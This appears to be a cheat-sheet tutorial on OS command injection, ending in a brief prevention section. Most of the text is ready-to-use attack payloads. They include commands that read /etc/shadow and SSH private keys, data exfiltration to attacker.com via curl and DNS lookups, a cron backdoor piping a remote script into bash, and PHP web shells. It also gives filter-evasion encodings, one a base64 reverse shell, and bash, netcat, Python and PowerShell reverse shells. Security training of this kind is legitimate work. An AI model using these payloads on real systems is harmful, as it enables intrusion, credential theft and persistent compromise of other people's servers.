## OS Command Injection (Shell Injection)

- **What it is**
  - A vulnerability that allows attackers to execute operating system commands on the server running the application
  - Also known as shell injection
  - Occurs when applications pass unsafe user input to a system shell
  - Can lead to complete compromise of the application and its data
  - Often allows attackers to pivot to other systems within the organization's infrastructure
  - Typically has a very high severity impact

- **How vulnerabilities arise**
  - Applications calling out to system commands with user-controllable input
  - Common vulnerable functions include:
    - Shell execution functions (`exec`, `system`, `popen`, etc.)
    - Functions that interact with the system shell
    - Wrappers around command-line utilities
  - Legacy code integrations where shell commands are used for convenience
  - Insecure implementation of features like:
    - File operations
    - Network utilities (ping, traceroute)
    - Email sending functionality
    - PDF/document generation
    - Media processing utilities

- **Types of OS command injection**
  
  - **Direct (in-band) command injection**
    - Command output is returned directly in application response
    - Easiest to exploit, as you can see the results immediately
    - Example vulnerable code (PHP):
      ```php
      $output = shell_exec('ping -c 4 ' . $_GET['host']);
      echo "<pre>$output</pre>";
      ```
    - Example attack: `https://example.com/ping?host=8.8.8.8;cat /etc/passwd`
  
  - **Blind (out-of-band) command injection**
    - Command is executed, but output is not returned in the response
    - More challenging to exploit but still dangerous
    - Example vulnerable code (PHP):
      ```php
      shell_exec('ping -c 4 ' . $_GET['host'] . ' > /dev/null 2>&1');
      echo "Ping completed";
      ```
    - Requires alternative exfiltration techniques

- **Detecting OS command injection**
  
  - **Direct detection techniques**
    
    - **Using command separators**
      - Basic test payloads for Unix-based systems:
        - `;ls -la`
        - `&& ls -la`
        - `| ls -la`
        - `|| ls -la`
        - `& ls -la`
        - ``` ` ls -la ` ```
        - `$(ls -la)`
      - Basic test payloads for Windows:
        - `& dir`
        - `&& dir`
        - `| dir`
        - `|| dir`
      - Example: `https://example.com/ping?host=8.8.8.8 & ls -la`
    
    - **Testing with injected echo commands**
      - Unix: `& echo OSCOMMANDINJECTTEST &`
      - Windows: `& echo OSCOMMANDINJECTTEST &`
      - Looking for the string "OSCOMMANDINJECTTEST" in the response
      - Example: `https://example.com/ping?host=8.8.8.8 & echo OSCOMMANDINJECTTEST &`
    
    - **Special character escaping sequences**
      - Test bypassing character filtering:
        - URL encoding: `%26%20ls%20-la`
        - Double URL encoding: `%2526%2520ls%2520-la`
        - Unicode variations: `＆ ls -la`
        - Mixed encoding: `%26 ls -la`
        - Line feeds: `%0A ls -la`
    
    - **Breaking out of quoted contexts**
      - If input is inserted within quotes:
        - Break out of single quotes: `' ; ls -la ; '`
        - Break out of double quotes: `" ; ls -la ; "`
        - Example: `https://example.com/ping?host='8.8.8.8' ; ls -la ; '`
  
  - **Blind detection techniques**
    
    - **Using time delays**
      - Unix payloads:
        - `& sleep 10 &`
        - `& ping -c 10 127.0.0.1 &`
        - ``` ` sleep 10 ` ```
        - `|| sleep 10 ||`
      - Windows payloads:
        - `& ping -n 10 127.0.0.1 &`
        - `|| timeout 10 ||`
      - If the application takes exactly the specified delay to respond, command injection likely exists
      - Example: `https://example.com/ping?host=8.8.8.8 & sleep 10 &`
    
    - **Out-of-band (OAST) techniques**
      - DNS-based detection:
        - `& nslookup uniqueid.burpcollaborator.net &`
        - `& dig uniqueid.attacker-server.com &`
        - ``` ` curl uniqueid.attacker-server.com ` ```
      - HTTP-based detection:
        - `& curl http://uniqueid.attacker-server.com &`
        - `& wget http://uniqueid.attacker-server.com &`
      - Requires monitoring a controlled domain for incoming connections
      - Example: `https://example.com/ping?host=8.8.8.8 & nslookup xyz123.attacker.com &`
    
    - **File creation and retrieval**
      - Create a file in a retrievable directory:
        - `& echo TEST > /var/www/html/test.txt &`
        - `& echo TEST > C:\inetpub\wwwroot\test.txt &`
      - Then attempt to retrieve the file via browser:
        - `https://example.com/test.txt`
      - Example: `https://example.com/ping?host=8.8.8.8 & echo pwned > /var/www/html/proof.txt &`

- **Exploiting OS command injection**
  
  - **Direct exploitation techniques**
    
    - **Gathering system information**
      - Operating system details:
        - Unix: `& uname -a &`
        - Windows: `& ver &`
      - Current user:
        - Unix/Windows: `& whoami &`
      - User privileges:
        - Unix: `& id &`
        - Windows: `& whoami /priv &`
      - Network configuration:
        - Unix: `& ifconfig &`
        - Windows: `& ipconfig /all &`
      - Directory listing:
        - Unix: `& ls -la &`
        - Windows: `& dir &`
      - Installed software:
        - Unix: `& dpkg -l &` or `& rpm -qa &`
        - Windows: `& wmic product get name,version &`
    
    - **Reading sensitive files**
      - Common sensitive files:
        - Unix: 
          - `& cat /etc/passwd &`
          - `& cat /etc/shadow &`
          - `& cat /home/user/.ssh/id_rsa &`
          - `& cat /var/www/html/config.php &`
        - Windows:
          - `& type C:\Windows\win.ini &`
          - `& type C:\Windows\System32\drivers\etc\hosts &`
          - `& type C:\Users\Administrator\Desktop\passwords.txt &`
      - Example: `https://example.com/ping?host=8.8.8.8 & cat /etc/passwd &`
    
    - **Writing files to gain persistence**
      - Web shells:
        - Unix: `& echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php &`
        - Windows: `& echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php &`
      - SSH keys:
        - `& echo "ssh-rsa AAAA..." >> /home/user/.ssh/authorized_keys &`
      - Scheduled tasks/cron jobs:
        - Unix: `& echo "* * * * * curl http://attacker.com/shell.php | bash" > /etc/cron.d/backdoor &`
        - Windows: `& schtasks /create /tn "Backdoor" /tr "powershell -e Base64EncodedPayload" /sc minute &`
  
  - **Blind exploitation techniques**
    
    - **Output redirection**
      - Redirecting command output to readable files:
        - Unix: `& whoami > /var/www/html/output.txt &`
        - Windows: `& whoami > C:\inetpub\wwwroot\output.txt &`
      - Appending to existing files:
        - Unix: `& id >> /var/www/html/output.txt &`
        - Windows: `& net user >> C:\inetpub\wwwroot\output.txt &`
      - Example: `https://example.com/ping?host=8.8.8.8 & cat /etc/passwd > /var/www/html/passwd.txt &`
    
    - **Data exfiltration using DNS**
      - Encode data in DNS lookups:
        - Unix: ``` & nslookup `whoami`.attacker.com & ```
        - Windows: ``` & nslookup %USERNAME%.attacker.com & ```
      - Chunking larger data:
        - Unix: ``` & for c in $(cat /etc/passwd | base64); do nslookup $c.attacker.com; done & ```
        - Windows: ``` & for /f "tokens=*" %i in ('type C:\secret.txt') do nslookup %i.attacker.com & ```
      - Example: `https://example.com/ping?host=8.8.8.8 & nslookup $(whoami).xyz123.attacker.com &`
    
    - **Using curl/wget for exfiltration**
      - Sending data via HTTP requests:
        - Unix: `& curl -d "data=$(cat /etc/passwd | base64)" http://attacker.com/collect &`
        - Windows: `& powershell -c "Invoke-WebRequest -Uri 'http://attacker.com/collect' -Method POST -Body ('data=' + [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content C:\Users\Administrator\Desktop\secret.txt))))" &`
      - Example: `https://example.com/ping?host=8.8.8.8 & curl http://attacker.com/exfil?data=$(cat /etc/shadow | base64) &`
    
    - **Time-based data exfiltration**
      - Extracting data bit by bit:
        - Unix: `& if [ $(grep -c "^root:" /etc/passwd) -eq 1 ]; then sleep 5; fi &`
        - Windows: `& if exist C:\secret.txt ping -n 5 127.0.0.1 &`
      - Conditionally exfiltrating character values:
        - Unix: `& if [ $(cat /etc/passwd | cut -c1-1) = "r" ]; then sleep 5; fi &`
      - Example: `https://example.com/ping?host=8.8.8.8 & if [ "$(whoami)" = "root" ]; then sleep 10; fi &`

- **Advanced OS command injection techniques**
  
  - **Bypassing input filters**
    
    - **Character substitution**
      - Using alternative characters for spaces:
        - Unix: `&cat${IFS}/etc/passwd&` or `&cat<>/etc/passwd&`
        - Windows: `&type%09C:\Windows\win.ini&`
      - Using environment variables:
        - Unix: `&$HOME&` (equivalent to `&/home/username&`)
        - Windows: `&%SYSTEMROOT%&` (equivalent to `&C:\Windows&`)
      - Using wildcards:
        - Unix: `&cat${IFS}/etc/p*ss*d&`
      - Hex/octal encoding:
        - Unix: `&$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")&`
    
    - **Command obfuscation**
      - Encoding commands:
        - Unix: `&echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d | bash &`
        - Windows: `&powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==&`
      - Variable reassignment:
        - Unix: `&a=c;b=at;c=/etc;d=passwd;$a$b $c/$d&`
      - Alternative syntax:
        - Unix: `&$(tr '\142\141\163\150' '\x62\x61\x73\x68' <<<'\142\141\163\150') -c 'cat /etc/passwd'&`
        - Windows: `&cmd /V:ON /C "set a=wh&set b=oami&call %a%%b%"&`
    
    - **Filter evasion techniques**
      - Nested commands:
        - Unix: `& $(echo cat) /etc/passwd &`
        - Windows: `& $(echo dir) &`
      - Case manipulation:
        - Unix: `& CaT /etc/passwd &`
        - Windows: `& DiR &`
      - Character insertion (if filtered out):
        - `& c'a't /etc/passwd &`
        - `& c"a"t /etc/passwd &`
      - Path manipulation:
        - Unix: `& /usr/bin/cat /etc/passwd &`
        - Unix: `& /???/b??/c?t /etc/passwd &`
        - Windows: `& %SYSTEMROOT%\System32\cmd.exe /c dir &`
    
    - **Alternative command execution**
      - Using less common utilities:
        - Unix: `& tac /etc/passwd &` (alternative to cat)
        - Unix: `& find /etc -name passwd -exec cat {} \; &`
        - Windows: `& powershell Get-Content C:\Windows\win.ini &`
      - Scripting languages:
        - Unix: `& python -c "import os; print(os.popen('cat /etc/passwd').read())" &`
        - Unix: `& perl -e 'system("cat /etc/passwd")' &`
        - Windows: `& powershell -c "Get-Content C:\Windows\win.ini" &`
  
  - **Command chaining and injection syntax**
    
    - **Command separators**
      - Works on both Unix and Windows:
        - `&` - Run commands in background
        - `&&` - Run second command if first succeeds
        - `|` - Pipe output of first command to second
        - `||` - Run second command if first fails
      - Unix-specific:
        - `;` - Run commands sequentially
        - Newline (`%0A`) - Run commands sequentially
      - Example: `https://example.com/ping?host=8.8.8.8 && cat /etc/passwd`
    
    - **Command substitution**
      - Unix syntax:
        - Backticks: ``` `command` ```
        - Modern syntax: `$(command)`
      - Windows syntax:
        - `for /f "tokens=*" %i in ('command') do echo %i`
      - Example: `https://example.com/ping?host=`whoami``
    
    - **Logic operators**
      - Examples:
        - `[ condition ] && command` - Execute if condition is true
        - `[ condition ] || command` - Execute if condition is false
        - `if [ condition ]; then command; fi` - Conditional execution
      - Example: `https://example.com/ping?host=8.8.8.8 && [ -f /etc/shadow ] && echo "Shadow exists"`

- **OS command injection on different platforms**
  
  - **Unix/Linux command injection**
    - System information gathering:
      - `uname -a` - System information
      - `id` - User and group information
      - `w` - Who is logged in
      - `ps -ef` or `ps aux` - Process listing
      - `netstat -an` - Network connections
      - `find / -perm -u=s -type f 2>/dev/null` - Find SUID binaries
    - Data access and exfiltration:
      - `grep -r password /var/www/` - Find password strings
      - `find / -name "*.conf" -type f -exec grep -l "password" {} \;` - Find config files with passwords
      - `tar -czf - /etc | base64` - Archive and encode sensitive directory
    - Reverse shells:
      - `bash -i >& /dev/tcp/attacker.com/4444 0>&1`
      - `nc -e /bin/sh attacker.com 4444`
      - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'`
  
  - **Windows command injection**
    - System information gathering:
      - `systeminfo` - Detailed system information
      - `whoami /all` - User, group and privileges information
      - `tasklist /v` - Process listing
      - `netstat -ano` - Network connections
      - `dir /s /b C:\*pass*.txt C:\*pass*.xml C:\*pass*.ini` - Find password files
    - Data access and exfiltration:
      - `findstr /si password *.xml *.ini *.txt *.config` - Find password strings
      - `reg query HKLM /f password /t REG_SZ /s` - Find passwords in registry
      - `certutil -encode C:\secrets.txt encoded.txt` - Encode sensitive file
    - Reverse shells:
      - `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

- **Prevention and mitigation**
  
  - **Secure coding practices**
    - Avoid using system commands where possible:
      - Use built-in language functions instead of external commands
      - Example: Use file manipulation functions instead of calling `rm`, `mv`, etc.
    - Use parameterized APIs if system commands are necessary:
      - Python: Use `subprocess.run()` with `shell=False` and array arguments
      - PHP: Use `escapeshellarg()` and `escapeshellcmd()` functions
      - Java: Prefer `ProcessBuilder` over `Runtime.exec()`
    - Example secure code (Python):
      ```python
      # Insecure
      os.system('ping -c 4 ' + user_input)
      
      # Secure
      subprocess.run(['ping', '-c', '4', user_input], shell=False)
      ```
  
  - **Input validation**
    - Implement strict input validation:
      - Whitelist allowed characters (alphanumeric only)
      - Validate against specific patterns (regex)
      - Validate input type (numeric, alphabetic, etc.)
    - Example validation code (PHP):
      ```php
      // Validate IP address
      if (!filter_var($_GET['host'], FILTER_VALIDATE_IP)) {
          die("Invalid IP address");
      }
      ```
  
  - **Secure architecture**
    - Implement proper privilege separation:
      - Run application with minimal required privileges
      - Use containerization or sandboxing
    - Apply the principle of least privilege:
      - Limit the commands that can be executed
      - Restrict file system access
    - Use appropriate security headers and configurations:
      - Content-Security-Policy
      - Firewall rules to limit outbound connections
  
  - **Additional protections**
    - Implement proper logging and monitoring:
      - Log all command executions with parameters
      - Set alerts for suspicious command patterns
    - Use Web Application Firewalls (WAFs):
      - Configure rules to detect command injection patterns
      - Block requests containing suspicious characters
    - Regular security testing:
      - Perform code reviews focused on command execution
      - Run automated and manual penetration tests
